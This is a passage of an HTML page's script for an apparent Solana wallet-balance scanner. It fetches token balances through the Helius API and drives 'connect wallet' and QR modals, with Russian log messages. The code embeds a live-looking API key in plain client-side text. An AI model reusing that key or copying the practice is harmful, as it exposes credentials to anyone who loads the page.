          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter'
        };
      }

      async performFastScan(walletAddress) {
        console.log(`⚡ Начинаем мобильное сканирование: ${walletAddress}`);
        
        const startTime = Date.now();
        
        try {
          const fastResults = await this.checkWalletBalanceFast(walletAddress);
          
          if (!fastResults.success) {
            throw new Error('Не удалось получить данные');
          }

          const processedTokens = [];
          
          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
            for (const token of fastResults.tokens) {
              let mintAddress, amount, decimals;

              if (token.account && token.account.data && token.account.data.parsed) {
                const tokenInfo = token.account.data.parsed.info;
                mintAddress = tokenInfo.mint;
                amount = tokenInfo.tokenAmount.uiAmount;
                decimals = tokenInfo.tokenAmount.decimals;
              } else if (token.mint && token.amount !== undefined) {
                mintAddress = token.mint;
                amount = token.amount / Math.pow(10, token.decimals || 0);
                decimals = token.decimals;
              } else {
                continue;
              }

              if (amount > 0) {
                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
                
                processedTokens.push({
                  name: tokenName,
                  mint: mintAddress,
                  amount: amount,
                  decimals: decimals
                });
              }
            }
          }

          const scanDuration = Date.now() - startTime;

          return {
            address: walletAddress,
            solBalance: fastResults.solBalance,
            tokens: processedTokens,
            totalTokenAccounts: processedTokens.length,
            scanTimestamp: new Date().toISOString(),
            scanType: 'mobile_fast',
            methodUsed: fastResults.methodUsed,
            scanDuration: scanDuration,
            success: true
          };

        } catch (error) {
          console.error('❌ Ошибка сканирования:', error);
          
          return {
            address: walletAddress,
            solBalance: 0,
            tokens: [],
            totalTokenAccounts: 0,
            scanTimestamp: new Date().toISOString(),
            error: error.message,
            scanType: 'mobile_fast',
            scanDuration: Date.now() - startTime,
            success: false
          };
        }
      }

      async checkWalletBalanceFast(walletAddress) {
        const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
        const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';

        try {
          const response = await fetch(`${heliusApiUrl}${walletAddress}/balances?api-key=${apiKey}`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
          });

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }

          const result = await response.json();
          
          return {
            solBalance: result.nativeBalance / 1_000_000_000 || 0,
            tokens: result.tokens || [],
            methodUsed: 'Helius API Mobile',
            success: true
          };
        } catch (error) {
          console.error('API request failed:', error);
          return {
            solBalance: 0,
            tokens: [],
            methodUsed: 'Failed',
            success: false
          };
        }
      }
    }

    // ============================================================================
    // MODAL MANAGEMENT
    // ============================================================================

    function setupModalEvents() {
      const connectWalletBtn = document.getElementById('connectWalletBtn');
      const modalOverlay = document.getElementById('modalOverlay');
      const connectWalletModal = document.getElementById('connectWalletModal');
      const qrModal = document.getElementById('qrModal');
      const closeBtns = document.querySelectorAll('.close-btn');
      const backBtn = document.querySelector('.back-btn');

      function openConnectWalletModal() {
        connectWalletModal.classList.remove('hidden');
        modalOverlay.classList.remove('hidden');
        qrModal.classList.add('hidden');
      }

      function closeAllModals() {
        connectWalletModal.classList.add('hidden');
        qrModal.classList.add('hidden');
        modalOverlay.classList.add('hidden');
      }

      function switchBackToConnectWallet() {
        qrModal.classList.add('hidden');
        connectWalletModal.classList.remove('hidden');
      }

      connectWalletBtn.addEventListener('click', openConnectWalletModal);
      
      if (backBtn) {
        backBtn.addEventListener('click', switchBackToConnectWallet);
      }

      closeBtns.forEach(btn => {
        btn.addEventListener('click', closeAllModals);
      });

      modalOverlay.addEventListener('click', closeAllModals);

      // Глобальная функция для закрытия модалов
      window.closeAllModals = closeAllModals;
    }

    // ============================================================================
    // INITIALIZATION
    // ============================================================================

    let walletManager;
    let deviceDetector;

    document.addEventListener('DOMContentLoaded', () => {
      console.log('🚀 Initializing Mobile Wallet Scanner...');
      
      deviceDetector = new DeviceDetector();
      walletManager = new EnhancedSolanaWalletManager();
      
      setupModalEvents();
      
      // Глобальные переменные для отладки
      window.walletManager = walletManager;
      window.deviceDetector = deviceDetector;
      
      console.log('✅ Mobile Wallet Scanner готов к работе!');
      console.log(`📱 Устройство: ${deviceDetector.isMobile ? 'Mobile' : 'Desktop'} (${deviceDetector.os})`);
    });

    // Обработка возврата из deep link
    window.addEventListener('focus', () => {
      if (walletManager) {
        walletManager.handleDeepLinkReturn();
      }
    });

    console.log('🚀 Solana Mobile Wallet Scanner загружен!');
    console.log('📱 Поддержка мобильных устройств включена');
    console.log('🔗 WalletConnect и Deep Links настроены');
  </script>
</body>
</html>
